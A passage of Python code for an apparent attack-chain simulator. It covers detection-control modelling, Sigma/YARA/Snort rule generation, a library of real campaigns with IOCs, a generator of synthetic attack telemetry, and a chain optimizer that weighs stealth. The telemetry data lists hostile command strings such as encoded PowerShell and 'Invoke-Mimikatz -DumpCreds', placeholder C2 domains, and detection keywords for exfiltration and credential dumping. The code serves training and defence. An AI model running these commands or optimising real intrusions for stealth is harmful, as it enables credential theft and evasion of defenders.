            'exfil': 'alert tcp $HOME_NET any -> $EXTERNAL_NET 443 (msg:"Large Outbound Transfer"; flow:established,to_server; dsize:>1000000; sid:1000002;)'
        }
    }
    
    def __init__(self):
        self.active_controls: Set[str] = set()
        self.detection_events: List[Dict] = []
        
    def configure_controls(self, controls: List[str]) -> Dict:
        """Configure active security controls"""
        self.active_controls = set(c for c in controls if c in self.SECURITY_CONTROLS)
        
        total_coverage = 1.0
        for control in self.active_controls:
            control_coverage = 1 - self.SECURITY_CONTROLS[control]['coverage']
            total_coverage *= control_coverage
        
        return {
            'active_controls': list(self.active_controls),
            'combined_coverage': round(1 - total_coverage, 2),
            'control_count': len(self.active_controls)
        }
    
    def simulate_detection(self, nodes: List[Dict]) -> Dict:
        """Simulate detection of attack chain by security controls"""
        import random
        
        self.detection_events = []
        detections_by_control: Dict[str, List] = {c: [] for c in self.active_controls}
        
        timeline = []
        current_time = 0
        
        for node in nodes:
            node_type = node.get('type', '').lower()
            node_name = node.get('name', '')
            node_duration = node.get('duration', 30)
            
            for control_id in self.active_controls:
                control = self.SECURITY_CONTROLS[control_id]
                
                # Check if this control can detect this attack type
                detection_chance = self._calculate_detection_chance(node_type, control)
                
                if random.random() < detection_chance:
                    detection_time = current_time + control['latency_minutes']
                    
                    detection_event = {
                        'control': control_id,
                        'control_name': control['name'],
                        'node_id': node.get('id'),
                        'node_name': node_name,
                        'detection_time_minutes': detection_time,
                        'confidence': round(detection_chance, 2),
                        'alert_severity': self._get_alert_severity(node_type)
                    }
                    
                    self.detection_events.append(detection_event)
                    detections_by_control[control_id].append(detection_event)
                    timeline.append(detection_event)
            
            current_time += node_duration / 60  # Convert to minutes
        
        # Sort timeline by detection time
        timeline.sort(key=lambda x: x['detection_time_minutes'])
        
        # Calculate metrics
        detected_nodes = set(d['node_id'] for d in self.detection_events)
        
        return {
            'total_detections': len(self.detection_events),
            'detected_nodes': len(detected_nodes),
            'total_nodes': len(nodes),
            'detection_rate': round(len(detected_nodes) / max(len(nodes), 1), 2),
            'detections_by_control': {k: len(v) for k, v in detections_by_control.items()},
            'first_detection_time': timeline[0]['detection_time_minutes'] if timeline else None,
            'detection_timeline': timeline[:20],  # First 20 events
            'undetected_nodes': [n for n in nodes if n.get('id') not in detected_nodes]
        }
    
    def _calculate_detection_chance(self, node_type: str, control: Dict) -> float:
        """Calculate probability of detection"""
        base_chance = control['coverage']
        
        # Adjust based on attack type vs control detection types
        type_mapping = {
            'process_behavior': ['exploit', 'malware', 'payload', 'persist'],
            'memory_injection': ['inject', 'shellcode', 'hook'],
            'traffic_anomaly': ['c2', 'beacon', 'exfil'],
            'log_anomaly': ['brute', 'spray', 'scan'],
            'data_exfil': ['exfil', 'dump', 'collect'],
            'user_anomaly': ['lateral', 'priv', 'imperson']
        }
        
        for detection_type in control['detection_types']:
            if detection_type in type_mapping:
                if any(kw in node_type for kw in type_mapping[detection_type]):
                    return min(0.95, base_chance * 1.3)
        
        return base_chance * 0.5
    
    def _get_alert_severity(self, node_type: str) -> str:
        """Determine alert severity based on attack type"""
        critical = ['ransom', 'destruct', 'wipe', 'exfil']
        high = ['privesc', 'lateral', 'c2', 'persist']
        medium = ['exploit', 'credential', 'dump']
        
        if any(kw in node_type for kw in critical):
            return 'critical'
        elif any(kw in node_type for kw in high):
            return 'high'
        elif any(kw in node_type for kw in medium):
            return 'medium'
        return 'low'
    
    def generate_detection_rules(self, nodes: List[Dict]) -> Dict:
        """Generate detection rules for the attack chain"""
        generated_rules = {
            'sigma': [],
            'yara': [],
            'snort': []
        }
        
        for node in nodes:
            node_type = node.get('type', '').lower()
            
            if 'phish' in node_type and 'phishing' in self.DETECTION_RULES['sigma']:
                generated_rules['sigma'].append({
                    'name': f"Detect {node.get('name', 'Phishing')}",
                    'rule': self.DETECTION_RULES['sigma']['phishing']
                })
            
            if 'mimikatz' in node_type or 'credential' in node_type:
                generated_rules['sigma'].append({
                    'name': f"Detect {node.get('name', 'Credential Dump')}",
                    'rule': self.DETECTION_RULES['sigma']['mimikatz']
                })
            
            if 'malware' in node_type or 'payload' in node_type:
                generated_rules['yara'].append({
                    'name': f"Detect {node.get('name', 'Malware')}",
                    'rule': self.DETECTION_RULES['yara']['malware']
                })
            
            if 'c2' in node_type:
                generated_rules['snort'].append({
                    'name': f"Detect {node.get('name', 'C2 Traffic')}",
                    'rule': self.DETECTION_RULES['snort']['c2_beacon']
                })
        
        return generated_rules


# ‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê
# ATTACK PATTERN LIBRARY - Curated attack patterns and techniques
# ‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê

class AttackPatternLibrary:
    """
    Library of curated attack patterns based on real-world campaigns
    """
    
    # Real-world attack campaigns
    CAMPAIGNS = {
        'solarwinds': {
            'name': 'SUNBURST (SolarWinds)',
            'actor': 'APT29 / Cozy Bear',
            'year': 2020,
            'description': 'Supply chain attack via SolarWinds Orion software updates',
            'phases': [
                {'name': 'Supply Chain Compromise', 'technique': 'T1195.002'},
                {'name': 'Trojanized Update', 'technique': 'T1195'},
                {'name': 'DLL Side-Loading', 'technique': 'T1574.002'},
                {'name': 'C2 via DNS', 'technique': 'T1071.004'},
                {'name': 'Credential Access', 'technique': 'T1003'},
                {'name': 'Lateral Movement', 'technique': 'T1021'},
                {'name': 'Data Collection', 'technique': 'T1560'},
                {'name': 'Exfiltration', 'technique': 'T1041'}
            ],
            'iocs': ['avsvmcloud.com', 'freescanonline.com'],
            'mitigations': ['Supply chain security', 'EDR monitoring', 'Network segmentation']
        },
        'wannacry': {
            'name': 'WannaCry',
            'actor': 'Lazarus Group',
            'year': 2017,
            'description': 'Ransomware worm exploiting EternalBlue (MS17-010)',
            'phases': [
                {'name': 'EternalBlue Exploit', 'technique': 'T1210'},
                {'name': 'SMB Propagation', 'technique': 'T1021.002'},
                {'name': 'Payload Execution', 'technique': 'T1204'},
                {'name': 'File Encryption', 'technique': 'T1486'},
                {'name': 'Ransom Note', 'technique': 'T1491'}
            ],
            'iocs': ['WannaCry.exe', 'tasksche.exe'],
            'mitigations': ['Patching', 'SMB disabled', 'Backups']
        },
        'notpetya': {
            'name': 'NotPetya',
            'actor': 'Sandworm',
            'year': 2017,
            'description': 'Destructive malware disguised as ransomware',
            'phases': [
                {'name': 'Supply Chain (M.E.Doc)', 'technique': 'T1195.002'},
                {'name': 'Credential Harvesting', 'technique': 'T1003'},
                {'name': 'Lateral Movement', 'technique': 'T1021.002'},
                {'name': 'MBR Overwrite', 'technique': 'T1561.002'},
                {'name': 'System Destruction', 'technique': 'T1485'}
            ],
            'iocs': ['perfc.dat', '027cc450ef5f8c5f653329641ec1fed91f694e0d229928963b30f6b0d7d3a745'],
            'mitigations': ['Network isolation', 'Credential hygiene', 'Backups']
        },
        'colonial_pipeline': {
            'name': 'Colonial Pipeline',
            'actor': 'DarkSide',
            'year': 2021,
            'description': 'Ransomware attack on critical infrastructure',
            'phases': [
                {'name': 'VPN Credential Theft', 'technique': 'T1078'},
                {'name': 'Initial Access', 'technique': 'T1133'},
                {'name': 'Reconnaissance', 'technique': 'T1083'},
                {'name': 'Ransomware Deployment', 'technique': 'T1486'},
                {'name': 'Double Extortion', 'technique': 'T1567'}
            ],
            'iocs': ['DarkSide ransomware samples'],
            'mitigations': ['MFA on VPN', 'Network segmentation', 'Backup isolation']
        },
        'log4shell': {
            'name': 'Log4Shell',
            'actor': 'Various',
            'year': 2021,
            'description': 'Critical RCE vulnerability in Apache Log4j',
            'phases': [
                {'name': 'JNDI Injection', 'technique': 'T1190'},
                {'name': 'Remote Class Loading', 'technique': 'T1059'},
                {'name': 'Payload Execution', 'technique': 'T1059.007'},
                {'name': 'Persistence', 'technique': 'T1053'},
                {'name': 'C2 Establishment', 'technique': 'T1071'}
            ],
            'iocs': ['${jndi:ldap://', '${jndi:rmi://'],
            'mitigations': ['Patching', 'WAF rules', 'Outbound filtering']
        },
        'kaseya_revil': {
            'name': 'Kaseya VSA (REvil)',
            'actor': 'REvil',
            'year': 2021,
            'description': 'Supply chain ransomware via Kaseya VSA',
            'phases': [
                {'name': 'Zero-Day Exploit', 'technique': 'T1190'},
                {'name': 'Authentication Bypass', 'technique': 'T1548'},
                {'name': 'Agent Push', 'technique': 'T1072'},
                {'name': 'Ransomware Deployment', 'technique': 'T1486'},
                {'name': 'Defense Evasion', 'technique': 'T1562'}
            ],
            'iocs': ['agent.crt', 'Kaseya VSA'],
            'mitigations': ['Vendor security assessment', 'Network isolation', 'Backup strategy']
        }
    }
    
    # Attack technique database
    TECHNIQUES = {
        'initial_access': [
            {'id': 'T1566.001', 'name': 'Spearphishing Attachment', 'difficulty': 'easy'},
            {'id': 'T1566.002', 'name': 'Spearphishing Link', 'difficulty': 'easy'},
            {'id': 'T1190', 'name': 'Exploit Public-Facing Application', 'difficulty': 'medium'},
            {'id': 'T1133', 'name': 'External Remote Services', 'difficulty': 'easy'},
            {'id': 'T1195.002', 'name': 'Supply Chain Compromise', 'difficulty': 'expert'}
        ],
        'execution': [
            {'id': 'T1059.001', 'name': 'PowerShell', 'difficulty': 'easy'},
            {'id': 'T1059.003', 'name': 'Windows Command Shell', 'difficulty': 'easy'},
            {'id': 'T1204', 'name': 'User Execution', 'difficulty': 'easy'},
            {'id': 'T1047', 'name': 'WMI', 'difficulty': 'medium'}
        ],
        'persistence': [
            {'id': 'T1547.001', 'name': 'Registry Run Keys', 'difficulty': 'easy'},
            {'id': 'T1053', 'name': 'Scheduled Task', 'difficulty': 'easy'},
            {'id': 'T1543.003', 'name': 'Windows Service', 'difficulty': 'medium'},
            {'id': 'T1136', 'name': 'Create Account', 'difficulty': 'easy'}
        ],
        'privilege_escalation': [
            {'id': 'T1068', 'name': 'Exploitation for Privilege Escalation', 'difficulty': 'hard'},
            {'id': 'T1548.002', 'name': 'UAC Bypass', 'difficulty': 'medium'},
            {'id': 'T1134', 'name': 'Access Token Manipulation', 'difficulty': 'medium'}
        ],
        'credential_access': [
            {'id': 'T1003.001', 'name': 'LSASS Memory', 'difficulty': 'medium'},
            {'id': 'T1003.003', 'name': 'NTDS', 'difficulty': 'hard'},
            {'id': 'T1110', 'name': 'Brute Force', 'difficulty': 'easy'},
            {'id': 'T1558.003', 'name': 'Kerberoasting', 'difficulty': 'medium'}
        ]
    }
    
    def __init__(self):
        self.custom_patterns: Dict[str, Dict] = {}
    
    def get_campaign(self, campaign_id: str) -> Optional[Dict]:
        """Get campaign details by ID"""
        return self.CAMPAIGNS.get(campaign_id)
    
    def list_campaigns(self) -> List[Dict]:
        """List all available campaigns"""
        return [
            {
                'id': cid,
                'name': c['name'],
                'actor': c['actor'],
                'year': c['year'],
                'phase_count': len(c['phases'])
            }
            for cid, c in self.CAMPAIGNS.items()
        ]
    
    def get_techniques_by_tactic(self, tactic: str) -> List[Dict]:
        """Get techniques for a specific tactic"""
        return self.TECHNIQUES.get(tactic, [])
    
    def build_chain_from_campaign(self, campaign_id: str) -> List[Dict]:
        """Build an attack chain from a real campaign"""
        campaign = self.CAMPAIGNS.get(campaign_id)
        if not campaign:
            return []
        
        nodes = []
        for i, phase in enumerate(campaign['phases']):
            nodes.append({
                'id': f"node_{i}",
                'name': phase['name'],
                'type': phase['name'].lower().replace(' ', '_'),
                'technique_id': phase['technique'],
                'campaign': campaign['name'],
                'actor': campaign['actor'],
                'position': i
            })
        
        return nodes
    
    def search_techniques(self, query: str) -> List[Dict]:
        """Search techniques across all tactics"""
        results = []
        query_lower = query.lower()
        
        for tactic, techniques in self.TECHNIQUES.items():
            for tech in techniques:
                if (query_lower in tech['name'].lower() or 
                    query_lower in tech['id'].lower()):
                    results.append({**tech, 'tactic': tactic})
        
        return results
    
    def get_campaign_iocs(self, campaign_id: str) -> List[str]:
        """Get IOCs for a campaign"""
        campaign = self.CAMPAIGNS.get(campaign_id)
        return campaign.get('iocs', []) if campaign else []
    
    def get_campaign_mitigations(self, campaign_id: str) -> List[str]:
        """Get mitigations for a campaign"""
        campaign = self.CAMPAIGNS.get(campaign_id)
        return campaign.get('mitigations', []) if campaign else []


# ‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê
# ATTACK TELEMETRY GENERATOR - Generate realistic attack telemetry
# ‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê

class TelemetryGenerator:
    """
    Generate realistic attack telemetry for training and testing
    """
    
    # Windows Event IDs
    WINDOWS_EVENTS = {
        'logon': {'id': 4624, 'source': 'Security', 'description': 'Successful Logon'},
        'logon_failed': {'id': 4625, 'source': 'Security', 'description': 'Failed Logon'},
        'process_create': {'id': 4688, 'source': 'Security', 'description': 'New Process Created'},
        'service_install': {'id': 7045, 'source': 'System', 'description': 'Service Installed'},
        'powershell': {'id': 4104, 'source': 'PowerShell', 'description': 'Script Block Logging'},
        'file_create': {'id': 11, 'source': 'Sysmon', 'description': 'File Created'},
        'network_connect': {'id': 3, 'source': 'Sysmon', 'description': 'Network Connection'},
        'registry': {'id': 13, 'source': 'Sysmon', 'description': 'Registry Value Set'},
        'dns_query': {'id': 22, 'source': 'Sysmon', 'description': 'DNS Query'}
    }
    
    # Sample malicious artifacts
    MALICIOUS_ARTIFACTS = {
        'processes': [
            'powershell.exe -enc', 'cmd.exe /c whoami',
            'mimikatz.exe', 'psexec.exe', 'cobalt_strike.exe',
            'rundll32.exe javascript:', 'mshta.exe vbscript:'
        ],
        'domains': [
            'evil-c2.com', 'data-exfil.net', 'update-server.xyz',
            'cdn-delivery.io', 'api-backend.co'
        ],
        'file_paths': [
            'C:\\Users\\Public\\payload.exe',
            'C:\\Windows\\Temp\\malware.dll',
            'C:\\ProgramData\\backdoor.ps1'
        ],
        'registry_keys': [
            'HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run',
            'HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnce'
        ]
    }
    
    def __init__(self):
        self.generated_events: List[Dict] = []
        
    def generate_for_chain(self, nodes: List[Dict]) -> List[Dict]:
        """Generate telemetry for entire attack chain"""
        import random
        
        self.generated_events = []
        base_time = datetime.now()
        time_offset = 0
        
        for node in nodes:
            node_type = node.get('type', '').lower()
            node_events = self._generate_node_telemetry(node, base_time, time_offset)
            self.generated_events.extend(node_events)
            time_offset += random.randint(60, 600)  # 1-10 minutes between nodes
        
        return self.generated_events
    
    def _generate_node_telemetry(self, node: Dict, base_time: datetime, 
                                  offset_seconds: int) -> List[Dict]:
        """Generate telemetry for a single node"""
        import random
        
        events = []
        event_time = base_time + timedelta(seconds=offset_seconds)
        node_type = node.get('type', '').lower()
        
        # Generate events based on node type
        if 'phish' in node_type or 'email' in node_type:
            events.extend([
                self._create_event('process_create', event_time, {
                    'process': 'outlook.exe',
                    'command_line': 'outlook.exe /safe',
                    'parent': 'explorer.exe'
                }),
                self._create_event('file_create', event_time + timedelta(seconds=5), {
                    'file_path': 'C:\\Users\\victim\\Downloads\\invoice.docm',
                    'process': 'outlook.exe'
                })
            ])
        
        elif 'exploit' in node_type or 'payload' in node_type:
            events.extend([
                self._create_event('process_create', event_time, {
                    'process': 'cmd.exe',
                    'command_line': random.choice(self.MALICIOUS_ARTIFACTS['processes']),
                    'parent': 'winword.exe'
                }),
                self._create_event('network_connect', event_time + timedelta(seconds=2), {
                    'destination': random.choice(self.MALICIOUS_ARTIFACTS['domains']),
                    'port': 443,
                    'process': 'powershell.exe'
                })
            ])
        
        elif 'persist' in node_type:
            events.extend([
                self._create_event('registry', event_time, {
                    'key': random.choice(self.MALICIOUS_ARTIFACTS['registry_keys']),
                    'value': 'backdoor',
                    'data': random.choice(self.MALICIOUS_ARTIFACTS['file_paths'])
                }),
                self._create_event('service_install', event_time + timedelta(seconds=10), {
                    'service_name': 'SysUpdate',
                    'binary_path': 'C:\\Windows\\Temp\\update.exe'
                })
            ])
        
        elif 'lateral' in node_type:
            events.extend([
                self._create_event('logon', event_time, {
                    'logon_type': 3,
                    'account': 'DOMAIN\\admin',
                    'source_ip': '192.168.1.100'
                }),
                self._create_event('network_connect', event_time + timedelta(seconds=1), {
                    'destination': '192.168.1.50',
                    'port': 445,
                    'process': 'services.exe'
                })
            ])
        
        elif 'c2' in node_type:
            for i in range(5):  # Multiple beacon events
                events.append(self._create_event('network_connect', 
                    event_time + timedelta(seconds=i*60), {
                    'destination': random.choice(self.MALICIOUS_ARTIFACTS['domains']),
                    'port': random.choice([80, 443, 8080]),
                    'process': 'rundll32.exe'
                }))
        
        elif 'exfil' in node_type:
            events.extend([
                self._create_event('file_create', event_time, {
                    'file_path': 'C:\\Windows\\Temp\\data.zip',
                    'size_bytes': random.randint(1000000, 100000000)
                }),
                self._create_event('network_connect', event_time + timedelta(seconds=30), {
                    'destination': 'cloud-storage.com',
                    'port': 443,
                    'bytes_sent': random.randint(1000000, 100000000)
                })
            ])
        
        elif 'credential' in node_type:
            events.extend([
                self._create_event('process_create', event_time, {
                    'process': 'lsass.exe',
                    'access_mask': '0x1010',
                    'caller': 'mimikatz.exe'
                }),
                self._create_event('powershell', event_time + timedelta(seconds=5), {
                    'script_block': 'Invoke-Mimikatz -DumpCreds'
                })
            ])
        
        else:
            # Generic event
            events.append(self._create_event('process_create', event_time, {
                'process': 'cmd.exe',
                'command_line': 'cmd.exe /c dir',
                'parent': 'explorer.exe'
            }))
        
        return events
    
    def _create_event(self, event_type: str, timestamp: datetime, 
                      data: Dict) -> Dict:
        """Create a telemetry event"""
        import uuid
        
        event_info = self.WINDOWS_EVENTS.get(event_type, 
            {'id': 0, 'source': 'Unknown', 'description': 'Unknown Event'})
        
        return {
            'event_id': str(uuid.uuid4()),
            'event_type': event_type,
            'windows_event_id': event_info['id'],
            'source': event_info['source'],
            'description': event_info['description'],
            'timestamp': timestamp.isoformat(),
            'data': data
        }
    
    def export_to_json(self) -> str:
        """Export generated events to JSON"""
        return json.dumps(self.generated_events, indent=2)
    
    def export_to_splunk(self) -> str:
        """Export in Splunk-compatible format"""
        lines = []
        for event in self.generated_events:
            line = f"{event['timestamp']} host=attacker source={event['source']} " \
                   f"EventID={event['windows_event_id']} {json.dumps(event['data'])}"
            lines.append(line)
        return "\n".join(lines)


# ‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê
# ATTACK CHAIN VALIDATOR - Validate chain logic and feasibility
# ‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê

class ChainValidator:
    """
    Validate attack chain logic, feasibility, and correctness
    """
    
    # Validation rules
    VALIDATION_RULES = {
        'has_initial_access': {
            'description': 'Chain must have initial access vector',
            'severity': 'error',
            'check': lambda nodes: any('initial' in n.get('type', '').lower() or 
                                       'phish' in n.get('type', '').lower() or
                                       'exploit' in n.get('type', '').lower() 
                                       for n in nodes)
        },
        'has_objective': {
            'description': 'Chain should have clear objective',
            'severity': 'warning',
            'check': lambda nodes: any('exfil' in n.get('type', '').lower() or 
                                       'impact' in n.get('type', '').lower() or
                                       'ransom' in n.get('type', '').lower() 
                                       for n in nodes)
        },
        'not_empty': {
            'description': 'Chain must have at least one node',
            'severity': 'error',
            'check': lambda nodes: len(nodes) > 0
        },
        'reasonable_size': {
            'description': 'Chain should have reasonable number of steps',
            'severity': 'warning',
            'check': lambda nodes: len(nodes) <= 50
        },
        'no_orphans': {
            'description': 'All nodes should be connected',
            'severity': 'warning',
            'check': lambda nodes, edges=None: True  # Would need edges
        }
    }
    
    # Prerequisite requirements
    PREREQUISITES = {
        'credential_access': ['initial_access', 'execution'],
        'lateral_movement': ['credential_access', 'discovery'],
        'exfiltration': ['collection', 'c2'],
        'impact': ['initial_access', 'execution'],
        'persistence': ['initial_access', 'execution'],
        'privilege_escalation': ['initial_access', 'execution']
    }
    
    def __init__(self):
        self.validation_results: List[Dict] = []
    
    def validate_chain(self, nodes: List[Dict], edges: List[Dict]) -> Dict:
        """Perform comprehensive chain validation"""
        self.validation_results = []
        
        # Run all validation rules
        for rule_id, rule in self.VALIDATION_RULES.items():
            try:
                passed = rule['check'](nodes)
                self.validation_results.append({
                    'rule': rule_id,
                    'description': rule['description'],
                    'severity': rule['severity'],
                    'passed': passed,
                    'message': 'Passed' if passed else f"Failed: {rule['description']}"
                })
            except Exception as e:
                self.validation_results.append({
                    'rule': rule_id,
                    'description': rule['description'],
                    'severity': 'error',
                    'passed': False,
                    'message': f"Validation error: {str(e)}"
                })
        
        # Check prerequisites
        prereq_issues = self._check_prerequisites(nodes)
        self.validation_results.extend(prereq_issues)
        
        # Check for cycles
        cycle_check = self._check_cycles(nodes, edges)
        self.validation_results.append(cycle_check)
        
        # Calculate overall status
        errors = sum(1 for r in self.validation_results 
                    if not r['passed'] and r['severity'] == 'error')
        warnings = sum(1 for r in self.validation_results 
                      if not r['passed'] and r['severity'] == 'warning')
        
        return {
            'valid': errors == 0,
            'error_count': errors,
            'warning_count': warnings,
            'total_checks': len(self.validation_results),
            'passed_checks': sum(1 for r in self.validation_results if r['passed']),
            'results': self.validation_results,
            'status': 'valid' if errors == 0 else 'invalid'
        }
    
    def _check_prerequisites(self, nodes: List[Dict]) -> List[Dict]:
        """Check if attack prerequisites are met"""
        issues = []
        node_types = [n.get('type', '').lower() for n in nodes]
        node_positions = {t: i for i, t in enumerate(node_types)}
        
        for tactic, prereqs in self.PREREQUISITES.items():
            # Check if this tactic is used
            tactic_used = any(tactic in nt for nt in node_types)
            if not tactic_used:
                continue
            
            # Check if prerequisites exist
            for prereq in prereqs:
                prereq_exists = any(prereq in nt for nt in node_types)
                if not prereq_exists:
                    issues.append({
                        'rule': f'prereq_{tactic}_{prereq}',
                        'description': f'{tactic} requires {prereq}',
                        'severity': 'warning',
                        'passed': False,
                        'message': f"Missing prerequisite: {prereq} should precede {tactic}"
                    })
        
        return issues
    
    def _check_cycles(self, nodes: List[Dict], edges: List[Dict]) -> Dict:
        """Check for cycles in the attack chain"""
        # Build adjacency list
        adj = {n.get('id'): [] for n in nodes}
        for edge in edges:
            src, tgt = edge.get('source'), edge.get('target')
            if src in adj:
                adj[src].append(tgt)
        
        # DFS for cycle detection
        visited = set()
        rec_stack = set()
        has_cycle = False
        
        def dfs(node):
            nonlocal has_cycle
            visited.add(node)
            rec_stack.add(node)
            
            for neighbor in adj.get(node, []):
                if neighbor not in visited:
                    dfs(neighbor)
                elif neighbor in rec_stack:
                    has_cycle = True
            
            rec_stack.remove(node)
        
        for node_id in adj:
            if node_id not in visited:
                dfs(node_id)
        
        return {
            'rule': 'no_cycles',
            'description': 'Chain should not have cycles',
            'severity': 'warning',
            'passed': not has_cycle,
            'message': 'No cycles detected' if not has_cycle else 'Cycle detected in chain'
        }
    
    def get_suggestions(self, validation_result: Dict) -> List[str]:
        """Get suggestions based on validation results"""
        suggestions = []
        
        for result in validation_result.get('results', []):
            if not result['passed']:
                if 'initial' in result['rule']:
                    suggestions.append("Add an initial access node (phishing, exploit, etc.)")
                elif 'objective' in result['rule']:
                    suggestions.append("Define a clear objective (exfiltration, impact, etc.)")
                elif 'prereq' in result['rule']:
                    suggestions.append(f"Add missing prerequisite: {result['message']}")
                elif 'cycle' in result['rule']:
                    suggestions.append("Review chain flow to remove circular dependencies")
        
        if not suggestions:
            suggestions.append("Chain validation passed - no issues detected")
        
        return suggestions


# ‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê
# MACHINE LEARNING CHAIN OPTIMIZER - ML-based chain optimization
# ‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê

class MLChainOptimizer:
    """
    Machine learning-based attack chain optimization using
    reinforcement learning concepts and genetic algorithms
    """
    
    # Fitness weights for genetic algorithm
    FITNESS_WEIGHTS = {
        'success_rate': 0.30,
        'stealth': 0.25,
        'speed': 0.20,
        'cost_efficiency': 0.15,
        'resilience': 0.10
    }
    
    # Mutation operations
    MUTATION_OPS = [
        'add_node', 'remove_node', 'swap_nodes', 
        'add_edge', 'remove_edge', 'modify_params'
    ]
    
    def __init__(self, population_size: int = 50, generations: int = 100):
        self.population_size = population_size
        self.generations = generations
